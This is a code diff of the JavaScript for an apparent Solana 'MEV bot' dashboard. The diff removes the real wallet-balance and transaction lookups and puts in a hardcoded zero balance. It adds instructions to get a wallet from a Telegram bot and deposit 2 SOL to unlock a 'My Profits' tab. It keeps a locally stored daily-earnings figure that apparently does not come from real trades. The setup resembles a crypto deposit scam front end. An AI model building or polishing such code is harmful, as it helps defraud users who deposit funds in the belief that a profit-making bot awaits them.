@@ -1,46 +1,37 @@
 document.addEventListener("DOMContentLoaded", function() {
-    console.log("DOM fully loaded");
     initializeWallet();
-    updateTodayStats();
-    fetchTransactions();
-    console.log("Initial functions called");
+    showTab('wallet-tab');
 });
 
-const STORAGE_KEY = 'solana_mev_stats';
-
 function initializeWallet() {
-    const urlParams = new URLSearchParams(window.location.search);
-    const walletAddress = urlParams.get('wallet');
-    console.log("Wallet address from URL:", walletAddress);  // Debug line added
-
-    if (walletAddress) {
-        document.getElementById("wallet-address").textContent = `Address: ${walletAddress}`;
-        fetchWalletBalance(walletAddress);
-    } else {
-        document.getElementById("wallet-address").textContent = "No wallet address provided";
-    }
+    document.getElementById("wallet-address").textContent = "To get your wallet address, go to the Telegram bot and type /get_wallet";
+    document.getElementById("wallet-balance").textContent = "Balance: 0 SOL";
+    document.getElementById("wallet-instructions").textContent = "Go to the Telegram bot, type /get_wallet and deposit 2 SOL to unlock the My Profits tab.";
+    updateProfitsTab();
 }
 
-async function fetchWalletBalance(walletAddress) {
-    try {
-        const response = await fetch(`https://api.mainnet-beta.solana.com`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                "jsonrpc": "2.0",
-                "id": 1,
-                "method": "getBalance",
-                "params": [walletAddress]
-            })
-        });
-        const data = await response.json();
-        const balance = data.result.value / 1000000000; // Convert lamports to SOL
-        document.getElementById("wallet-balance").textContent = `Balance: ${balance.toFixed(4)} SOL`;
-    } catch (error) {
-        console.error("Error fetching wallet balance:", error);
-        document.getElementById("wallet-balance").textContent = "Error fetching balance";
-    }
+function updateProfitsTab() {
+    const profitsContent = document.getElementById("profits-content");
+    profitsContent.innerHTML = `
+        <p>🔒 Deposit at least 2 SOL to your wallet to access this area.</p>
+        <p>To get your wallet address and make a deposit:</p>
+        <ol>
+            <li>Go to the Telegram bot</li>
+            <li>Type /get_wallet</li>
+            <li>Follow the instructions to deposit 2 SOL</li>
+        </ol>
+    `;
 }
+
+function showTab(tabId) {
+    const tabs = document.getElementsByClassName("tab-content");
+    for (let tab of tabs) {
+        tab.style.display = "none";
+    }
+    document.getElementById(tabId).style.display = "block";
+}
+
+const STORAGE_KEY = 'solana_mev_stats';
 
 function getStoredStats() {
     const storedStats = localStorage.getItem(STORAGE_KEY);
@@ -82,17 +73,29 @@ function updateTodayStats() {
     document.getElementById("today-stats").textContent = `${currentValue.toFixed(2)} SOL`;
 }
 
-async function fetchTransactions() {
-    const urlParams = new URLSearchParams(window.location.search);
-    const walletAddress = urlParams.get('wallet');
-    console.log("Fetching transactions for wallet:", walletAddress);  // Debug line added
-
-    if (!walletAddress) {
-        console.log("No wallet address provided for transactions");  // Debug line added
-        document.getElementById("transactions-list").innerHTML = "No wallet address provided";
-        return;
+// The following functions are kept for future use when implementing actual wallet integration
+async function fetchWalletBalance(walletAddress) {
+    try {
+        const response = await fetch(`https://api.mainnet-beta.solana.com`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                "jsonrpc": "2.0",
+                "id": 1,
+                "method": "getBalance",
+                "params": [walletAddress]
+            })
+        });
+        const data = await response.json();
+        const balance = data.result.value / 1000000000; // Convert lamports to SOL
+        document.getElementById("wallet-balance").textContent = `Balance: ${balance.toFixed(4)} SOL`;
+    } catch (error) {
+        console.error("Error fetching wallet balance:", error);
+        document.getElementById("wallet-balance").textContent = "Error fetching balance";
     }
+}
 
+async function fetchTransactions(walletAddress) {
     try {
         const response = await fetch(`https://api.mainnet-beta.solana.com`, {
             method: 'POST',
@@ -129,41 +132,7 @@ async function fetchTransactions() {
     }
 }
 
-function displayTransactions(transactions) {
-    const transactionsList = document.getElementById("transactions-list");
-    transactionsList.innerHTML = ""; // Clear existing transactions
-
-    transactions.forEach(tx => {
-        const amount = tx.lamport / 1000000000; // Convert lamports to SOL
-        if (amount > 1) {
-            const txElement = document.createElement("div");
-            txElement.className = "transaction";
-            
-            const date = new Date(tx.blockTime * 1000).toLocaleString();
-            const isTokenSwap = tx.tokenTransfers && tx.tokenTransfers.length > 0;
-            const title = isTokenSwap ? "Nexus MEV Attack" : "Solana Transaction";
-
-            txElement.innerHTML = `
-                <div class="transaction-title">${title}</div>
-                <div class="transaction-amount">${amount.toFixed(2)} SOL</div>
-                <div class="transaction-date">${date}</div>
-            `;
-
-            transactionsList.appendChild(txElement);
-        }
-    });
-}
-
-function showTab(tabId) {
-    const tabs = document.getElementsByClassName("tab-content");
-    for (let tab of tabs) {
-        tab.style.display = "none";
-    }
-    document.getElementById(tabId).style.display = "block";
-}
-
-// Update today's stats and fetch new transactions every 30 seconds
+// Update today's stats every 30 seconds (for future use)
 setInterval(() => {
     updateTodayStats();
-    fetchTransactions();
 }, 30000);
